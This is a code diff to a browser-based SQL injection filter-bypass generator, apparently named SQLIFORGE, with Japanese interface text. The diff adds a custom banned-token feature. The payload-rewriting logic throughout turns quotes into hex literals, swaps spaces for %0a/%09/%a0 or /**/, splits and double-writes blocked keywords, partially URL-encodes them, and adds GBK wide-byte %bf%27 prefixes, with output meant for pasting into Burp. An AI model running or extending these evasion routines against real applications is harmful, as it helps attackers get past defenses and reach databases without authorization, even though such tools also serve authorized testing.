@@ -107,6 +107,24 @@ function altCase(s){
   return out.join("");
 }
 
+function maskedReplace(p,tok,replacement){
+  const m=codeMask(p);
+  const re=new RegExp(tok,"gi");
+  let out="";
+  let last=0;
+  let mm;
+  while((mm=re.exec(p))!==null){
+    const idx=mm.index;
+    if(m[idx]){
+      out+=p.slice(last,idx)+replacement;
+      last=idx+mm[0].length;
+    }
+    re.lastIndex=idx+mm[0].length;
+  }
+  out+=p.slice(last);
+  return out;
+}
+
 function caseShift(s,dir){
   const out=new Array(s.length);
   let inS=false;
@@ -133,9 +151,12 @@ function wrapSub(t){
   return "(SELECT "+t+")";
 }
 
-function applyFilters(payload, active, mode){
+function applyFilters(payload, active, mode, bans){
+  bans=bans||new Set();
   const steps=[],warns=[],variants=[];
   const has=id=>active.has(id);
+  const banHas=t=>bans.has(t);
+  const inlineBlocked=has("inline")||banHas("/*")||banHas("/**/");
   let p=payload;
 
   if(has("comment")||has("inline")){
@@ -179,13 +200,15 @@ function applyFilters(payload, active, mode){
 
   if(has("comma")){
     const before=p;
-    p=p.replace(/\b(char)\s*\(([\d,\s]+)\)/gi,(m,f,args)=>{
-      const codes=args.split(",").map(x=>parseInt(x.trim(),10)).filter(x=>!isNaN(x));
-      const s=String.fromCharCode(...codes);
-      const h=hexLit(s);
-      return h||m;
-    });
-    if(p!==before) steps.push("CHAR(97,100,...) を 16進リテラル 0x... に変換 (カンマ消滅)");
+    if(!banHas("0x")){
+      p=p.replace(/\b(char)\s*\(([\d,\s]+)\)/gi,(m,f,args)=>{
+        const codes=args.split(",").map(x=>parseInt(x.trim(),10)).filter(x=>!isNaN(x));
+        const s=String.fromCharCode(...codes);
+        const h=hexLit(s);
+        return h||m;
+      });
+      if(p!==before) steps.push("CHAR(97,100,...) を 16進リテラル 0x... に変換 (カンマ消滅)");
+    }
     const subBefore=p;
     p=convertSubstrCommas(p);
     if(p!==subBefore) steps.push("SUBSTR(x,a,b) / MID を SUBSTR(x FROM a FOR b) 構文に変換 (カンマ不要)");
@@ -218,26 +241,30 @@ function applyFilters(payload, active, mode){
 
   if(has("quote")){
     const before=p;
-    let outp="";
-    let i=0;
-    let fail=false;
-    let conv=0;
-    while(i<p.length){
-      const ch=p[i];
-      if(ch==="'"){
-        const j=p.indexOf("'",i+1);
-        if(j===-1){ outp+=ch; i++; continue; }
-        const inner=p.slice(i+1,j);
-        if(inner.length>0&&/\s/.test(inner)){ outp+=ch; i++; continue; }
-        const h=inner===""?"0x":hexLit(inner);
-        if(h===null){ fail=true; outp+=ch; i++; continue; }
-        outp+=h; conv++; i=j+1; continue;
+    if(banHas("0x")){
+      warns.push("引用符と 0x の両方が禁止 → 16進リテラル不可。数値コンテキストを狙うか、カンマが使えるなら CHAR(...)、または対象の値を直接比較する形へ手動で再構成を。");
+    }else{
+      let outp="";
+      let i=0;
+      let fail=false;
+      let conv=0;
+      while(i<p.length){
+        const ch=p[i];
+        if(ch==="'"){
+          const j=p.indexOf("'",i+1);
+          if(j===-1){ outp+=ch; i++; continue; }
+          const inner=p.slice(i+1,j);
+          if(inner.length>0&&/\s/.test(inner)){ outp+=ch; i++; continue; }
+          const h=inner===""?"0x":hexLit(inner);
+          if(h===null){ fail=true; outp+=ch; i++; continue; }
+          outp+=h; conv++; i=j+1; continue;
+        }
+        outp+=ch; i++;
       }
-      outp+=ch; i++;
+      p=outp;
+      if(conv) steps.push("文字列リテラル 'abc' を 16進リテラル 0x616263 に変換 ("+conv+"個 / 引用符不要)");
+      if(fail) warns.push("非ラテン1文字を含むリテラルは hex 化不能 (UTF-8 は1バイトずつ抜く方式で)。");
     }
-    p=outp;
-    if(p!==before) steps.push("文字列リテラル 'abc' を 16進リテラル 0x616263 に変換 ("+conv+"個 / 引用符不要)");
-    if(fail) warns.push("非ラテン1文字を含むリテラルは hex 化不能 (UTF-8 は1バイトずつ抜く方式で)。");
     variants.push({t:"ワイドバイト (addslashes + GBK/Big5 環境)",p:payload.replace(/'/,"%bf%27")});
     warns.push("addslashes + マルチバイト文字コード (SET NAMES gbk 等) なら先頭に %bf%27 を付けるワイドバイトが有効。数値コンテキストなら引用符自体不要。");
   }
@@ -293,28 +320,36 @@ function applyFilters(payload, active, mode){
   }
 
   if(has("space")){
+    const wsAlts=["%0a","%09","%0b","%0c","%0d","%a0"].filter(t=>!banHas(t));
     const cm=p.match(/\s*(--\s*-|--|#|\/\*|;%00)\s*$/);
     let tail="";
     let body=p;
     if(cm){ tail=cm[0]; body=p.slice(0,p.length-tail.length); }
-    if(/^#/.test(tail)) tail="#";
-    else if(/^\/\*/.test(tail)) tail="/*";
-    else if(tail) tail="#";
-    if(!has("inline")){
+    if(!inlineBlocked){
+      tail=banHas("#")?((banHas(";")||banHas("%00"))?"":";%00"):"#";
+    }else if(tail){
+      if(banHas("#")) tail=(banHas(";")||banHas("%00"))?"":";%00";
+      else tail="#";
+    }else{
+      tail="";
+    }
+    if(tail==="#"&&!banHas("--")) variants.push({t:"コメント # を -- に (PG/MSSQL/SQLite用。-- の後ろに改行 %0a を付ける)",p:body.replace(/\s+/g,"/**/")+"--%0a"});
+    if(!inlineBlocked){
       const before=body;
       body=body.replace(/\s+/g,"/**/");
       if(body!==before) steps.push("スペースを /**/ に変換");
-    }else{
+    }else if(wsAlts.length){
+      const pick=wsAlts[0];
       const before=body;
-      body=body.replace(/\s+/g,"%0a");
-      if(body!==before){ steps.push("スペースを %0a (改行) に変換 — このまま Burp に貼る。MySQL/PG/SQLite で有効なことが多い"); }
-      variants.push({t:"スペース→タブ %09",p:(body+tail).replace(/%0a/g,"%09")});
-      variants.push({t:"スペース→垂直タブ %0b",p:(body+tail).replace(/%0a/g,"%0b")});
-      variants.push({t:"スペース→%a0",p:(body+tail).replace(/%0a/g,"%a0")});
-      variants.push({t:"コメント # を -- に (PG/MSSQL/SQLite用)",p:(body+"--")});
+      body=body.replace(/\s+/g,pick);
+      if(body!==before){ steps.push("スペースを "+pick+" に変換 (禁止済みの代替を除外し、利用可能なものを自動選択)"); }
+      wsAlts.slice(1).forEach(t=>variants.push({t:"スペース→"+t,p:(body+tail).replace(new RegExp(pick.replace("%","\\%"),"g"),t)}));
+    }else{
+      warns.push("スペース代替 (%09 %0a %0b %0c %0d %a0) と /**/ が全て禁止 → 括弧グルーピング: 1'and(select(1)) の形式で組み立てること。");
     }
     p=body+tail;
-    if(tail==="#"&&!has("inline")) steps.push("末尾コメントを # に正規化 (スペース除去環境では -- の後続空白が消えて死ぬため。# は MySQL 専用なのでPG/MSSQLでは代替案の -- を使う)");
+    if(tail==="#"&&!has("inline")) steps.push("末尾コメントを # に正規化 (-- の後続空白が問題になる環境対策。# が禁止なら %00 か引用符で自分で閉じる)");
+    if(tail==="") warns.push("コメント系トークンが全て禁止 → 出力はクエリを自分で閉じる必要あり (代替案の終端パターン参照)。");
   }
 
   if(has("upper")||has("lower")||has("casecap")){
@@ -333,6 +368,41 @@ function applyFilters(payload, active, mode){
     }
     if(has("upper")&&has("lower")) warns.push("大文字も小文字も拒否される → 文字クラス [A-Za-z] 拒否なら ASCII で書けないが、実際は 'UNION'/'union' の単語完全一致のケースが多い → casecap (Union) チップで先頭大文字化すれば通ることが多い。");
     if(dir==="upper"&&!has("casecap")) warns.push("大文字化の注意: DB側識別子の大文字小文字 (MySQL/Linuxのテーブル名は区別、Oracleディクショナリは大文字、PGの未クォート識別子は小文字) と、HEX() の出力が大文字である点に気をつける。");
+  }
+
+  for(const tok of bans){
+    if(!tok) continue;
+    const isAlpha=/^[a-z0-9_]+$/i.test(tok);
+    if(isAlpha){
+      if(!p.toLowerCase().includes(tok.toLowerCase())) continue;
+      const applyMasked=repl=>{
+        const np=maskedReplace(p,tok,repl);
+        if(np!==p){ p=np; return true; }
+        return false;
+      };
+      if(tok.length>=3&&mode==="replace"&&applyMasked(doubleWrite(tok))){
+        steps.push("カスタム禁止語 <b>"+tok+"</b> を二重書き化: "+doubleWrite(tok));
+        continue;
+      }
+      if(tok.length>=4&&!inlineBlocked&&!banHas("/*")){
+        const h=Math.ceil(tok.length/2);
+        const sp=tok.slice(0,h)+"/**/"+tok.slice(h);
+        if(applyMasked(sp)){
+          steps.push("カスタム禁止語 <b>"+tok+"</b> をコメント分割化: "+sp);
+          continue;
+        }
+      }
+      if(tok.length>=3){
+        const pe=tok[0]+"%25"+tok.slice(1);
+        if(applyMasked(pe)){
+          steps.push("カスタム禁止語 <b>"+tok+"</b> を部分URLエンコード化: "+pe+" (サーバが再度デコードする場合のみ有効)");
+          continue;
+        }
+      }
+      warns.push("カスタム禁止トークン '"+tok+"' が引用符内リテラル等で残存 → 値そのものは書き換え不能。対象値の取得方法 (LIKE部分一致など) で手動回避を。");
+    }else{
+      if(p.includes(tok)) warns.push("カスタム禁止トークン '"+tok+"' がペイロードに残存 → 自動変換不能 (記号)。手動で回避すること。");
+    }
   }
 
   const leftovers=[];
@@ -413,6 +483,21 @@ if(typeof document!=="undefined"){
 
 let state={urlenc:{}};
 const active=new Set();
+let customBans=new Set();
+
+function parseCustomBans(){
+  const raw=($("bp-custom")||{value:""}).value||"";
+  const toks=raw.split(/[\n,、]+/).map(t=>t.trim()).filter(t=>t.length>0);
+  customBans=new Set(toks.map(t=>/^[a-z0-9_\[\]-]+$/i.test(t)?t.toLowerCase():t));
+  let added=[];
+  for(const t of customBans){
+    const m=BAN_TO_CHIP.find(x=>x.t===t);
+    if(m) m.chips.forEach(c=>{ if(!active.has(c)){ active.add(c); added.push(c); } });
+  }
+  renderChips();
+  refreshAll();
+  if(added.length) toast("カスタム禁止から "+[...new Set(added)].length+" 個のチップを自動設定");
+}
 
 function $(id){ return document.getElementById(id); }
 
@@ -450,11 +535,11 @@ function btnRow(payload,raw){
 const DBCLS={"MySQL / MariaDB":"db-mysql","PostgreSQL":"db-pg","SQLite":"db-sqlite","MSSQL (SQL Server)":"db-mssql","Oracle":"db-oracle"};
 
 function fx(raw){
-  if(!active.size) return {final:raw,changed:false,steps:[],warns:[]};
+  if(!active.size&&!customBans.size) return {final:raw,changed:false,steps:[],warns:[]};
   const mode=$("bp-mode").value;
   const steps=[],warns=[];
   const final=String(raw).split("\n").map(ln=>{
-    const r=applyFilters(ln,active,mode);
+    const r=applyFilters(ln,active,mode,customBans);
     r.steps.forEach(s=>{ if(!steps.includes(s)) steps.push(s); });
     r.warns.forEach(w=>{ if(!warns.includes(w)) warns.push(w); });
     return r.out;
@@ -892,7 +977,7 @@ function refreshAll(){
 function runBypass(){
   const input=$("bp-input").value.trim();
   if(!input){ $("bp-out").textContent=""; return; }
-  const res=applyFilters(input,active,$("bp-mode").value);
+  const res=applyFilters(input,active,$("bp-mode").value,customBans);
   $("bp-out").textContent=res.out||input;
   $("bp-out-enc").textContent=urlEnc(res.out||input);
   const steps=[...res.steps.map(s=>'<div class="step">✔ '+s+'</div>'),...res.warns.map(w=>'<div class="step warn">⚠ '+w+'</div>')];
@@ -1280,9 +1365,10 @@ function initUI(){
 
   renderChips();
   $("bp-run").addEventListener("click",runBypass);
-  $("bp-clear").addEventListener("click",()=>{active.clear();renderChips();refreshAll();});
+  $("bp-clear").addEventListener("click",()=>{active.clear();customBans.clear();$("bp-custom").value="";renderChips();refreshAll();});
   $("bp-input").addEventListener("input",runBypass);
   $("bp-mode").addEventListener("change",()=>{runBypass();refreshAll();});
+  $("bp-custom").addEventListener("input",parseCustomBans);
   $("bp-preset").addEventListener("change",()=>{
     const p=PRESETS[parseInt($("bp-preset").value,10)];
     active.clear(); (p.ids||[]).forEach(i=>active.add(i));
@@ -1318,7 +1404,7 @@ function initUI(){
     runBypass();
     toast("プレイグラウンドへ送りました");
   };
-  window.SQLIFORGE._internals={active:active,refreshAll:refreshAll,wzGo:wzGo,renderWizard:renderWizard,wz:wz};
+  window.SQLIFORGE._internals={active:active,refreshAll:refreshAll,wzGo:wzGo,renderWizard:renderWizard,wz:wz,customBans:customBans,parseCustomBans:parseCustomBans,setBans:s=>{customBans=s;}};
   refreshAll();
   genScript(false);
 }
